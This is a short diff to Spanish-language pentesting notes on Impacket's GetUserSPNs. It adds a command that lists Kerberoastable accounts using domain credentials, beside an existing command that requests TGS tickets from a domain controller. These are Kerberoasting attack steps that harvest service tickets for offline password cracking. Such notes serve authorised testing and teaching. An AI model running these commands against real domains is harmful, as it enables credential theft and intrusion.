@@ -84,6 +84,8 @@ GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicament
 ```
 
 ```bash 
+❯ impacket-GetUserSPNs domain.corp/user:Password     # Ver si el usuario es Kerberosteable y lista los usuarios a los que puedes solicitar un TGS
+
 ❯ impacket-GetUserSPNs domain1.corp/clearpass.user:Password@1 -dc-ip IP -request
 
 	# dc-ip = Dirección IP del DC
